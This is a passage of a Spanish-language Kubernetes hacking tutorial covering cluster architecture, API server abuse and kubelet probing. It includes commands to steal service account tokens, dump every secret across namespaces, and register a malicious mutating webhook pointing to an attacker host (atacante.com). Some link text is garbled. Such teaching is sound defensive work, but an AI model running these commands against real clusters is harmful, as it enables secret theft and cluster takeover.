# Hacking en Containers y Kubernetes — Guía Ultra-Detallada

> **Versión**: 1.0 | **Idioma**: Español (AR) | **Nivel**: Intermedio-Avanzado

---

## Índice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (3285 lineas)


1. [Introducción](#1-introducción)
2. [Arquitectura de Kubernetes](#2-arquitectura-de-kubernetes)
   - 2.1 [Control Plane](#21-control-plane)
   - 2.2 [Worker Nodes](#22-worker-nodes)
   - 2.3 [etcd](#23-etcd)
   - 2.4 [API Server](#24-api-server)
   - 2.5 [Scheduler](#25-scheduler)
   - 2.6 [Controller Manager](#26-controller-manager)
   - 2.7 [Kubelet](#27-kubelet)
   - 2.8 [Kube-proxy](#28-kube-proxy)
   - 2.9 [Container Runtime Interface (CRI)](#29-container-runtime-interface-cri)
   - 2.10 [Red en Kubernetes (CNI)](#210-red-en-kubernetes-cni)
3. [API Server Abuse](#3-api-server-abuse)
   - 3.1 [Anonymous Access](#31-anonymous-access)
   - 3.2 [RBAC Misconfiguration](#32-rbac-misconfiguration)
   - 3.3 [Service Account Token Extraction](#33-service-account-token-extraction)
   - 3.4 [kubectl Commands Ofensivos](#34-kubectl-commands-ofensivos)
   - 3.5 [API Server Discovery y Fingerprinting](#35-api-server-discovery-y-fingerprinting)
   - 3.6 [Abuso de Aggregated APIServices](#36-abuso-de-aggregated-apiservices)
   - 3.7 [Webhook Backdooring](#37-webhook-backdooring)
4. [Kubelet Exploitation](#4-kubelet-exploitation)
   - 4.1 [Kubelet Read-Only API](#41-kubelet-read-only-api)
   - 4.2 [Kubelet Authenticated API](#42-kubelet-authenticated-api)
   - 4.3 [Pod Listing y Enumeración](#43-pod-listing-y-enumeración)
   - 4.4 [Exec Into Containers via Kubelet](#44-exec-into-containers-via-kubelet)
   - 4.5 [Endpoints /pods y /runningpods](#45-endpoints-pods-y-runningpods)
   - 4.6 [Kubelet Port Forwarding](#46-kubelet-port-forwarding)
   - 4.7 [Abuso de Kubelet Config](#47-abuso-de-kubelet-config)
5. [etcd Exploitation](#5-etcd-exploitation)
   - 5.1 [Direct Database Access](#51-direct-database-access)
   - 5.2 [Key Enumeration](#52-key-enumeration)
   - 5.3 [Secret Extraction](#53-secret-extraction)
   - 5.4 [Certificate Theft](#54-certificate-theft)
   - 5.5 [etcd Snapshot Extraction](#55-etcd-snapshot-extraction)
   - 5.6 [etcd sin TLS/anonymous access](#56-etcd-sin-tlsanonymous-access)
6. [Container Breakouts](#6-container-breakouts)
   - 6.1 [Privileged Container](#61-privileged-container)
   - 6.2 [hostPID Abuse](#62-hostpid-abuse)
   - 6.3 [hostNetwork Abuse](#63-hostnetwork-abuse)
   - 6.4 [hostPath Volume Mounts](#64-hostpath-volume-mounts)
   - 6.5 [Capabilities Abuse](#65-capabilities-abuse)
   - 6.6 [Docker Socket Mounting (Docker-in-Docker)](#66-docker-socket-mounting-docker-in-docker)
   - 6.7 [Breakout via cgroups](#67-breakout-via-cgroups)
   - 6.8 [Breakout via /proc/sysrq-trigger](#68-breakout-via-procsysrq-trigger)
   - 6.9 [Breakout via Container Runtime CVE](#69-breakout-via-container-runtime-cve)
   - 6.10 [Abuso de user namespace mappings](#610-abuso-de-user-namespace-mappings)
7. [Pod Security](#7-pod-security)
   - 7.1 [Pod Security Standards (PSS)](#71-pod-security-standards-pss)
   - 7.2 [Pod Security Admission (PSA)](#72-pod-security-admission-psa)
   - 7.3 [OPA Gatekeeper](#73-opa-gatekeeper)
   - 7.4 [Kyverno](#74-kyverno)
   - 7.5 [Security Context Constraints (SCC) en OpenShift](#75-security-context-constraints-scc-en-openshift)
   - 7.6 [Bypassing Admission Controllers](#76-bypassing-admission-controllers)
8. [Service Mesh Attacks](#8-service-mesh-attacks)
   - 8.1 [Istio Sidecar Injection](#81-istio-sidecar-injection)
   - 8.2 [mTLS Bypass](#82-mtls-bypass)
   - 8.3 [Envoy Configuration Manipulation](#83-envoy-configuration-manipulation)
   - 8.4 [Service Mesh Traffic Interception](#84-service-mesh-traffic-interception)
   - 8.5 [Istio AuthZ Bypass](#85-istio-authz-bypass)
9. [Supply Chain Attacks](#9-supply-chain-attacks)
   - 9.1 [Image Vulnerability Scanning](#91-image-vulnerability-scanning)
   - 9.2 [Base Image Poisoning](#92-base-image-poisoning)
   - 9.3 [Admission Controller Bypass](#93-admission-controller-bypass)
   - 9.4 [Malicious Sidecar Injection via Admission Webhook](#94-malicious-sidecar-injection-via-admission-webhook)
   - 9.5 [Registry Spoofing y Man-in-the-Middle](#95-registry-spoofing-y-man-in-the-middle)
   - 9.6 [Image CVE Exploitation](#96-image-cve-exploitation)
10. [Herramientas](#10-herramientas)
    - 10.1 [kube-hunter](#101-kube-hunter)
    - 10.2 [kube-bench](#102-kube-bench)
    - 10.3 [kubectl-who-can](#103-kubectl-who-can)
    - 10.4 [Peirates](#104-peirates)
    - 10.5 [Kubesploit](#105-kubesploit)
    - 10.6 [Bottlerocket](#106-bottlerocket)
    - 10.7 [kubeaudit](#107-kubeaudit)
    - 10.8 [kubescape](#108-kubescape)
    - 10.9 [kubectl-foreach](#109-kubectl-foreach)
    - 10.10 [Rakkess](#1010-rakkess)
11. [Escenarios Prácticos](#11-escenarios-prácticos)
    - 11.1 [Escenario 1: Descubrimiento de API Server Expuesto](#111-escenario-1-descubrimiento-de-api-server-expuesto)
    - 11.2 [Escenario 2: Escalada desde un Pod con Service Account](#112-escenario-2-escalada-desde-un-pod-con-service-account)
    - 11.3 [Escenario 3: etcd sin Protección](#113-escenario-3-etcd-sin-protección)
    - 11.4 [Escenario 4: Breakout de Container Privilegiado](#114-escenario-4-breakout-de-container-privilegiado)
    - 11.5 [Escenario 5: Envenenamiento de Supply Chain](#115-escenario-5-envenenamiento-de-supply-chain)
    - 11.6 [Escenario 6: Ataque a Service Mesh](#116-escenario-6-ataque-a-service-mesh)
12. [Ejercicios Prácticos](#12-ejercicios-prácticos)
13. [Referencias y Recursos](#13-referencias-y-recursos)

---

## 1. Introducción

[kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md) se convirtió en el estándar de facto para orquestación de contenedores. Grandes empresas, startups y hasta gobiernos corren sus cargas de trabajo en clusters [k8s](../raw/k8s-d33p-d1v3.md). La promesa de escalabilidad, resiliencia y portabilidad viene con una superficie de ataque enorme.

Esta guía cubre **todos los vectores de ataque** conocidos contra infraestructura Kubernetes: desde la enumeración del API Server hasta breakouts de contenedores, pasando por service mesh, supply chain y etcd. Cada sección incluye:

- **Fundamentos teóricos**: cómo funciona cada componente internamente
- **Comandos prácticos**: lo que escribirías en una terminal real
- **Código de ejemplo**: scripts, YAMLs y exploits
- **Ejercicios**: para que practiques en un lab controlado

> **Advertencia legal**: Todo el contenido es con fines educativos y de hardening. Atacar infraestructura sin autorización es ilegal. Usá un [cluster](../raw/k8s-d33p-d1v3.md#cluster) de test (KinD, Minikube, K3s) para practicar.

---

## 2. Arquitectura de [kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md)

Antes de hackear [k8s](../raw/k8s-d33p-d1v3.md), necesitás entender cómo está construido. Kubernetes sigue una arquitectura de plano de control + nodos trabajadores.

### 2.1 Control Plane

El **Control Plane** (antes llamado Master) es el cerebro del [cluster](../raw/k8s-d33p-d1v3.md#cluster). Corre en uno o más nodos dedicados (idealmente 3 o 5 para alta disponibilidad). Sus componentes:

```
┌─────────────────────────────────────────┐
│            CONTROL PLANE                │
│  ┌──────┐  ┌────────┐  ┌────────────┐  │
│  │ etcd │  │  API   │  │ Scheduler  │  │
│  │      │◄─┤ Server │◄─┤            │  │
│  └──────┘  └────────┘  └────────────┘  │
│  ┌────────────┐  ┌───────────────────┐ │
│  │ Controller │  │  Cloud Controller │ │
│  │  Manager   │  │    Manager        │ │
│  └────────────┘  └───────────────────┘ │
└─────────────────────────────────────────┘
```

#### Componentes individuales:

**API Server (kube-apiserver)**:
- Es la puerta de entrada a todo el cluster
- Expone una API RESTful en el [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 6443 ([https](../raw/r3d3s-f0nd4m3nt0s.md#https)) o 8080 ([http](../raw/r3d3s-f0nd4m3nt0s.md#http) [legacy](../raw/l3g4cy-3nt3rpr1s3.md), deshabilitado por defecto)
- Autentica y autoriza cada petición
- Valida y muta objetos antes de persistirlos en etcd
- Todos los demás componentes se comunican con él

**Scheduler (kube-scheduler)**:
- Asigna Pods a nodos basándose en recursos disponibles, taints/tolerations, afinidades
- Toma decisiones de scheduling pero no crea los Pods directamente
- Usa etcd para leer la especificación del [pod](../raw/k8s-d33p-d1v3.md#pods) y actualizar el binding

**Controller Manager (kube-controller-manager)**:
- Corre loops de control que reconcilian el estado actual con el deseado
- Incluye: Node Controller, Replication Controller, Endpoint Controller, Service Account Controller, etc.
- Cada controller es un bucle infinito que watcha recursos y reacciona a cambios

**etcd**:
- Base de datos clave-valor distribuida (basada en Raft)
- Almacena TODO el estado del cluster: configuraciones, secretos, deployments, RBAC, etc.
- Es el componente más crítico desde la perspectiva de seguridad
- Por defecto corre en el puerto 2379 (con [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) y 2380 (peer communication)

### 2.2 Worker Nodes

Los nodos trabajadores son donde corren los Pods reales:

```
┌────────────────────────────────────────┐
│           WORKER NODE                  │
│  ┌──────────┐  ┌────────────────────┐  │
│  │ Kubelet  │  │  Kube-proxy       │  │
│  │          │  │  (iptables/ipvs)  │  │
│  └────┬─────┘  └────────┬───────────┘  │
│       │                 │               │
│  ┌────▼─────────────────▼───────────┐  │
│  │   Container Runtime (containerd)│  │
│  │   ┌─────┐ ┌─────┐ ┌─────┐      │  │
│  │   │ Pod │ │ Pod │ │ Pod │      │  │
│  │   │     │ │     │ │     │      │  │
│  │   └─────┘ └─────┘ └─────┘      │  │
│  └──────────────────────────────────┘  │
└────────────────────────────────────────┘
```

#### Kubelet

El **kubelet** es el agente que corre en CADA nodo del cluster. Es como el "guardián" del nodo:

- Se registra con el API Server
- Escucha en el puerto 10250 (autenticado) y 10255 (read-only, legacy)
- Asegura que los contenedores estén corriendo según las especificaciones
- Expone una API propia para operaciones de pod
- Puede ejecutar comandos dentro de contenedores (kubectl exec termina acá)
- Reporta health checks, logs, resource usage

#### Kube-[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)

El **kube-proxy** maneja las reglas de [red](../raw/r3d3s-f0nd4m3nt0s.md):

- Corre como un DaemonSet en cada nodo
- Implementa Services usando iptables, IPVS o userspace
- Enruta tráfico a los Pods correctos
- NO es un proxy en el sentido tradicional (no acepta conexiones entrantes)

#### [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Runtime Interface (CRI)

Kubernetes no usa [docker](../raw/d0ck3r-f0r-h4ck3rs.md) directamente (aunque puede). Usa CRI:

- **containerd**: el más común (adoptado por Docker, GKE, EKS)
- **CRI-O**: runtime liviano creado por Red Hat
- **Docker**: soportado via dockershim (deprecado desde K8s 1.24)

### 2.3 etcd

etcd merece su propia sección porque es EL componente más jugoso para un atacante.

**Arquitectura**:
- Almacenamiento jerárquico (como un filesystem): `/registry/pods/default/mi-pod`
- Datos serializados como protobuf (o JSON en versiones viejas)
- Usa el [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red) Raft para consistencia distribuida
- Por defecto solo escucha en localhost (127.0.0.1, no en 0.0.0.0) — pero esto se puede cambiar

**Datos almacenados en etcd**:

```
/registry/secrets/default/mi-secret    → Secret (base64 encoded)
/registry/deployments/default/mi-app   → Deployment spec
/registry/configmaps/default/mi-cm     → ConfigMap
/registry/pods/default/mi-pod-xyz      → Pod status, spec, metadata
/registry/nodes/minikube               → Node info
/registry/serviceaccounts/default/*    → Service Accounts + tokens
/registry/roles/*                      → ClusterRoles/Roles
/registry/rolebindings/*               → RoleBindings
/registry/certificatesigningrequests/* → CSRs
```

**Vulnerabilidades comunes de etcd**:
- Sin TLS (escucha en HTTP plano)
- Sin autenticación (anonymous access habilitado)
- Acceso desde el [contenedor](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) de etcd
- Certificados de cliente expuestos en el host
- Snapshots sin protección

### 2.4 API Server

El API Server es el corazón del cluster. Cada `kubectl` command, cada petición de los controladores, cada webhook — todo pasa por acá.

**Flujo de una petición**:

```
Petición HTTP → Autenticación → Autorización → Admission Controllers → etcd
                                                                    ↓
                                                              Response
```

**Puertos**:
- `6443`: HTTPS con autenticación (producción)
- `8080`: HTTP sin auth (solo dev, deshabilitado en clusters modernos)
- `8132`/`8133`: Aggregated API Server

**Autenticación (módulos)**:
1. **Client Certificates**: certificados TLS firmados por la CA del cluster
2. **Static Token**: tokens estáticos en archivos
3. **Bootstrap Token**: usado para join de nodos
4. **Service Account Tokens**: tokens [jwt](../raw/4p1-s3cur1ty.md#jwt) montados en Pods
5. **OpenID Connect (OIDC)**: integration con providers externos
6. **Webhook Token**: autenticación delegada a un servicio externo

**Autorización**:
1. **RBAC** (Role-Based Access Control): el más común
2. **ABAC** (Attribute-Based Access Control): legacy, complicado
3. **Node**: autorización especial para kubelets
4. **Webhook**: delegada a servicio externo

Los módulos se ejecutan en cadena. Si ALGUNO dice "Sí, está autorizado", la petición pasa. La excepción es que TODOS los módulos deniegan para que se deniegue.

### 2.5 Scheduler

El scheduler decide DÓNDE correr cada Pod. Mira:

- **Resource Requests/Limits**: CPU, memoria, ephemeral storage
- **Node Selectors**: `nodeSelector` en el Pod spec
- **Node Affinity/Anti-Affinity**: reglas complejas de placement
- **Taints and Tolerations**: qué nodos aceptan qué Pods
- **Pod Topology Spread Constraints**: distribuir Pods entre zonas

**Ataques relacionados con el scheduler**:
- Pods maliciosos que reclaman muchos recursos (DoS)
- NodeSelector manipulado para aterrizar en nodos específicos
- Taint evasion para correr en nodos restringidos

### 2.6 Controller Manager

El Controller Manager es un conjunto de loops de control:

| Controller | Función |
|---|---|
| Node Controller | Monitorea nodos, marca como NotReady |
| Replication Controller | Mantiene el número correcto de réplicas |
| Endpoint Controller | Actualiza Endpoints/EndpointSlices |
| Service Account Controller | Crea Service Accounts y tokens |
| Namespace Controller | Borra namespaces y su contenido |
| Garbage Collector | Limpia recursos huérfanos |
| CronJob Controller | Ejecuta CronJobs |

Cada controller tiene [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) específicos en RBAC. Si un atacante compromete el Controller Manager, puede manipular recursos a gran escala.

### 2.7 Kubelet

El kubelet es EL componente más atacable desde adentro del cluster:

**API del kubelet**:

| Endpoint | Puerto | Auth | Descripción |
|---|---|---|---|
| `/healthz` | 10248 | No | Health check |
| `/pods` | 10250/10255 | Sí/No | Lista de Pods |
| `/runningpods` | 10250/10255 | Sí/No | Pods en ejecución |
| `/exec` | 10250 | Sí | Ejecuta comandos |
| `/run` | 10250 | Sí | Corre un comando |
| `/attach` | 10250 | Sí | Attach a un container |
| `/portForward` | 10250 | Sí | Port forward |
| `/containerLogs` | 10250 | Sí | Logs de container |
| `/stats/summary` | 10250 | Sí | Métricas de Pods |
| `/metrics` | 10250 | Sí | Métricas Prometheus |
| `/configz` | 10250 | Sí | Config del kubelet |
| `/debug/pprof` | 10250 | Sí | Profiling data |

**Autenticación del kubelet**:
- Puertos 10250 requiere autenticación (client certs o bearer token)
- Puerto 10255 es read-only y NO requiere autenticación (deshabilitado por defecto en K8s 1.20+)
- Usa el Webhook de autorización del API Server para decidir qué puede hacer cada quien

El kubelet tiene su propio modo de autorización:
- `AlwaysAllow`: cualquiera con autenticación puede hacer cualquier cosa (default en clusters viejos)
- `Webhook`: delega al API Server (más seguro)

### 2.8 Kube-proxy

Kube-proxy mantiene las reglas de red. Modos:

1. **Userspace** (legacy, lento): un proxy real que escucha en puertos y reenvía
2. **iptables** (default hasta K8s 1.28): reglas de iptables para [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat)
3. **IPVS** (Linux-only): más performante que iptables para clusters grandes
4. **KernelSpace** (Windows): modo específico para Windows

**Superficie de ataque del kube-proxy**:
- Modificación de reglas de iptables
- Redirección de tráfico a nodos atacantes
- Bypass de NetworkPolicies
- Escucha de tráfico interno (si se configura mal)

### 2.9 Container Runtime Interface (CRI)

Kubernetes abstrae el runtime de contenedores via CRI:

```
Kubelet → CRI shim → containerd/CRI-O → runc/gvisor
```

**Runtimes populares**:
- **runc**: el default, directo al [kernel](../raw/0s-f0nd4m3nt0s.md#kernel)
- **gVisor**: capa de sandboxing (Google)
- **Kata Containers**: VM lightweight para cada container
- **Firecracker**: microVM de [aws](../raw/cl0ud-h4ck1ng.md#aws) (usado en Fargate)

**Vulnerabilidades de runtime**:
- Escapes via syscalls en runc ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2019-5736, [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2024-...)
- Abuso de /proc y /sys mounts
- Namespace escape via unshare

### 2.10 Red en Kubernetes (CNI)

La red en K8s se maneja via **Container Network Interface (CNI)**:

**Plugins populares**:
- **Calico**: NetworkPolicies, [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp) routing, eBPF
- **Flannel**: overlay simple (VXLAN, host-gw)
- **Weave Net**: mesh, encriptación
- **Cilium**: eBPF-based, Hubble observability
- **Antrea**: Open vSwitch-based

**Modelo de red K8s**:
1. Todos los Pods pueden comunicarse con todos los Pods sin NAT
2. Todos los nodos pueden comunicarse con todos los Pods sin NAT
3. El [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) que ve un Pod es el mismo que ven los demás

**NetworkPolicies**:
- [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) a nivel de aplicación (Layer 3/4)
- No son reglas de red tradicionales (no hay DENY por defecto hasta que se aplica una policy)
- Selectores de pods, namespaces, CIDRs
- Implementadas por el plugin CNI (no por kube-proxy)

**Ataques a la red**:
- Pods sin NetworkPolicy pueden alcanzar cualquier recurso
- Metadata service spoofing (169.254.169.254 en clouds)
- [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing) dentro del nodo
- [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) hijacking via CoreDNS manipulation
- Traffic sniffing si no hay mTLS

---

## 3. API Server Abuse

El API Server es la puerta de entrada. Si logramos acceso, tenemos el [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster)).

### 3.1 Anonymous Access

[kubernetes](../raw/k8s-d33p-d1v3.md) permite (por defecto en algunos clusters) que usuarios anónimos hagan peticiones al API Server.

**Verificar si anonymous access está habilitado**:

```bash
# Probar acceso anónimo
curl -k https://<API_SERVER_IP>:6443/api/v1/pods

# Si devuelve datos sin autenticación → vulnerable
# Si devuelve 403 Forbidden → hay auth pero capaz podemos leer algo
# Si devuelve 401 Unauthorized → anonymous deshabilitado

# Probar con API version discovery
curl -k https://<API_SERVER_IP>:6443/apis/
```

**Configuración que lo permite** (en `kube-apiserver.yaml`):

```yaml
# --anonymous-auth=true (por defecto es TRUE!)
```

**Qué puede hacer un usuario anónimo**:

Depende de los ClusterRoleBindings. Si existe un binding como:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-access
subjects:
- kind: User
  name: system:anonymous
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

Eso le da FULL ACCESS a cualquiera sin autenticación. Existe en clusters mal configurados.

**Formas más sutiles**:
- `system:anonymous` + `system:unauthenticated` bindeado a roles de lectura

```bash
# Enumerar qué puede hacer anonymous
kubectl auth can-i --list --as=system:anonymous
kubectl auth can-i get pods --as=system:anonymous
kubectl auth can-i create pods --as=system:anonymous
```

### 3.2 RBAC Misconfiguration

RBAC es el sistema de autorización más usado y el más mal configurado.

**Conceptos clave**:

```
Rule (verbs + resources) → Role/ClusterRole → RoleBinding/ClusterRoleBinding → Subject (User/Group/SA)
```

**Verbos disponibles**: `get`, `list`, `watch`, `create`, `update`, `patch`, `delete`, `deletecollection`, `impersonate`, `bind`, `escalate`

**Recursos comunes**: `pods`, `deployments`, `secrets`, `configmaps`, `services`, `nodes`, `persistentvolumes`, `serviceaccounts`, `roles`, `rolebindings`

**Subrecursos**: `pods/log`, `pods/exec`, `pods/portforward`, `deployments/scale`

**Wildcards peligrosos**:

```yaml
# Esto da acceso a TODO
rules:
- verbs: ["*"]
  resources: ["*"]
  apiGroups: ["*"]
```

**Ejemplo de ClusterRoleBinding excesivo**:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-binding
subjects:
- kind: ServiceAccount
  name: default
  namespace: production
roleRef:
  kind: ClusterRole
  name: edit
  apiGroup: rbac.authorization.k8s.io
```

Esto le da [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de `edit` (puede leer/escribir casi todo) al ServiceAccount `default` del namespace `production`.

**Otros errores comunes**:

- `get` en `secrets` permite leer secretos [http](../raw/r3d3s-f0nd4m3nt0s.md#http)
- `list` en `pods` permite ver pods de otros namespaces
- `create pod` + service account con permisos = escalada
- `impersonate` permite hacerse pasar por otros usuarios

```bash
# Verificar permisos de un ServiceAccount
kubectl auth can-i --list --as=system:serviceaccount:default:mi-sa

# Enumerar todos los ClusterRoles
kubectl get clusterroles -o yaml | grep -A5 "rules:"

# Ver qué puede hacer el SA default
kubectl auth can-i get secrets --as=system:serviceaccount:default:default
```

### 3.3 Service Account Token Extraction

Cada [pod](../raw/k8s-d33p-d1v3.md#pods) en [k8s](../raw/k8s-d33p-d1v3.md) tiene un Service Account (por defecto, `default`). El token se monta automáticamente en:

```
/var/run/secrets/kubernetes.io/serviceaccount/
├── ca.crt       # CA del cluster
├── namespace    # Namespace actual
└── token        # JWT del Service Account
```

**Extraer el token desde un Pod**:

```bash
# Leer el token JWT
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Leer el namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Una línea para copiar
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Probar el token contra el API Server
curl -sk https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods \
  -H "Authorization: Bearer $TOKEN"

# Descubrir el API Server endpoint (variables de entorno)
env | grep KUBERNETES_SERVICE
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443
```

**Decodificar el [jwt](../raw/4p1-s3cur1ty.md#jwt) localmente**:

```bash
# La parte del medio es el payload (base64url)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
PAYLOAD=$(echo $TOKEN | cut -d. -f2)
# Decodificar (agregar padding si falta)
echo $PAYLOAD | base64 -d 2>/dev/null || echo $PAYLOAD | base64 -d -i 2>/dev/null

# Con Python
python3 -c "import sys,base64; print(base64.urlsafe_b64decode(sys.argv[1]+'==').decode())" $PAYLOAD
```

**[payload](../raw/m3t4spl01t.md#payloads) típico de un SA token**:

```json
{
  "iss": "kubernetes/serviceaccount",
  "kubernetes.io/serviceaccount/namespace": "default",
  "kubernetes.io/serviceaccount/secret.name": "default-token-xyz",
  "kubernetes.io/serviceaccount/service-account.name": "default",
  "kubernetes.io/serviceaccount/service-account.uid": "...",
  "sub": "system:serviceaccount:default:default"
}
```

**Token Review (validar si el token es válido)**:

```bash
curl -sk https://kubernetes.default.svc/apis/authentication.k8s.io/v1/tokenreviews \
  -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenReview","spec":{"token":"'"$TOKEN"'"}}'
```

### 3.4 kubectl Commands Ofensivos

Si tenés acceso al cluster (token o kubeconfig), estos son los comandos más útiles para enumeración y ataque:

**Enumeración inicial**:

```bash
# ¿Qué podemos hacer?
kubectl auth can-i --list

# Versión del cluster
kubectl version

# Nodos
kubectl get nodes -o wide

# Todos los namespaces con sus Pods
kubectl get pods --all-namespaces

# Recursos del cluster
kubectl api-resources --verbs=list -o name | sort

# Roles y bindings
kubectl get clusterroles -o name
kubectl get clusterrolebindings -o name
kubectl get roles --all-namespaces
kubectl get rolebindings --all-namespaces

# Secrets (si tenemos permisos)
kubectl get secrets --all-namespaces

# ServiceAccounts
kubectl get serviceaccounts --all-namespaces
```

**[escalada de privilegios](../raw/l1n9x-pr1v3sc.md)**:

```bash
# Si podemos crear Pods, podemos montar el disco del host
kubectl run priv-pod --image=ubuntu --restart=Never \
  -o yaml --dry-run=client > priv-pod.yaml

# Ver qué SA puede crear Pods en otros namespaces
kubectl auth can-i create pods --as=system:serviceaccount:kube-system:default

# Si tenemos impersonate, escalar
kubectl --as=admin get secrets --all-namespaces
```

**Exfiltración de datos**:

```bash
# Copiar secretos a un archivo local
kubectl get secret mi-secret -o jsonpath='{.data}'

# Decodificar base64
kubectl get secret mi-secret -o jsonpath='{.data.password}' | base64 -d

# Listar todos los secretos de todos los namespaces con valores
for ns in $(kubectl get ns -o name | cut -d/ -f2); do
  for sec in $(kubectl get secrets -n $ns -o name | cut -d/ -f2); do
    echo "=== $ns/$sec ==="
    kubectl get secret $sec -n $ns -o yaml
  done
done
```

**Ejecución en Pods existentes**:

```bash
# Si tenemos access a exec
kubectl exec -it <pod> -- sh

# Listar Pods con sus contenedores para ver dónde ejecutar
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[*].name}{"\n"}{end}'
```

### 3.5 API Server Discovery y Fingerprinting

Antes de atacar, hay que encontrar el API Server.

**Desde afuera del cluster**:

```bash
# Shodan / Censys
# Buscar: port:6443 kubernetes
# Buscar: "kind: Pod" "apiVersion"

# Nmap
nmap -p 6443,443 <target>
nmap -sV -p 6443 <target>

# openssl s_client para ver certificado
echo | openssl s_client -connect <target>:6443 -servername <target> 2>/dev/null | openssl x509 -text -noout
```

**Fingerprinting del API Server**:

```bash
# Versión via unauthenticated request (si permite)
curl -k https://<target>:6443/version

# OpenAPI spec
curl -k https://<target>:6443/openapi/v2

# Descubrir grupos de API
curl -k https://<target>:6443/apis/
curl -k https://<target>:6443/api/v1
```

**Desde adentro del cluster**:

```bash
# DNS interno (el API Server siempre está en kubernetes.default.svc)
nslookup kubernetes.default.svc

# Variables de entorno
env | grep -i kubernetes

# /etc/hosts o DNS config
cat /etc/resolv.conf
```

### 3.6 Abuso de Aggregated APIServices

Kubernetes permite extender la API con **Aggregated API Servers**. Son servicios que se registran como extensiones de la API de K8s.

**Cómo detectarlos**:

```bash
kubectl get apiservices
kubectl get apiservices | grep -v v1.
```

**Ataque**: Si un Aggregated API Server tiene vulnerabilidades, podés:

1. Bypassear políticas de RBAC (porque extiende la API)
2. Acceder a endpoints no validados
3. Inyectar respuestas maliciosas

**Ejemplo de APIService vulnerable**:

```yaml
apiVersion: apiregistration.k8s.io/v1
kind: APIService
metadata:
  name: v1.example.com
spec:
  version: v1
  group: example.com
  service:
    name: api-service
    namespace: default
  insecureSkipTLSVerify: true
```

Si `insecureSkipTLSVerify: true` y el servicio backend es controlable, podés interceptar tráfico.

### 3.7 Webhook Backdooring

Los webhooks son HTTP callbacks que K8s llama durante la admisión de recursos.

**Tipos**:
- **MutatingWebhookConfiguration**: modifica recursos antes de crearlos
- **ValidatingWebhookConfiguration**: valida recursos y puede rechazarlos

**Ataques**:
1. Registrar un webhook malicioso que ignore mutaciones/patch recursos arbitrarios
2. Si tenés acceso a `create` en `mutatingwebhookconfigurations`, podés interceptar TODO lo que se crea en el cluster
3. DoS por timeout (si el webhook no responde, el cluster se detiene)

```bash
# Listar webhooks existentes
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations

# Crear un webhook malicioso (si tenemos permisos)
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: malicious-webhook
webhooks:
- name: malwebhook.evil.com
  clientConfig:
    url: https://atacante.com/webhook
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["*"]
    apiVersions: ["*"]
    resources: ["*"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
EOF
```

---

## 4. Kubelet Exploitation

El kubelet es probablemente el componente más explotable desde dentro del [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster)). Cada nodo corre un kubelet que expone una API interesante.

### 4.1 Kubelet Read-Only API

Históricamente, el kubelet exponía un [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) **read-only** (10255) sin autenticación. En clusters modernos está deshabilitado, pero muchos clusters [legacy](../raw/l3g4cy-3nt3rpr1s3.md) todavía lo tienen.

```bash
# Probar acceso read-only
curl -k http://<NODE_IP>:10255/pods
curl -k http://<NODE_IP>:10255/healthz
curl -k http://<NODE_IP>:10255/runningpods
curl -k http://<NODE_IP>:10255/metrics

# Si responde, tenemos enumeración gratuita de pods
curl -s http://<NODE_IP>:10255/pods | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, node: .spec.nodeName}'
```

**Qué podemos obtener**:
- Lista completa de Pods en el nodo (nombres, namespaces, imágenes)
- Métricas de recursos
- Health status

Si el puerto 10255 está abierto, eso indica que el kubelet se inició con `--read-only-port=10255`. En clusters modernos se deshabilita con `--read-only-port=0`.

### 4.2 Kubelet Authenticated API

El puerto 10250 requiere autenticación, pero hay formas de bypassearla:

**Métodos de autenticación al kubelet**:

1. **Client certificate**: el método legítimo
2. **Bearer token**: el mismo token del Service Account
3. **Anonymous**: si `--anonymous-auth=true` (default!)

```bash
# Probar con anonymous
curl -k https://<NODE_IP>:10250/pods

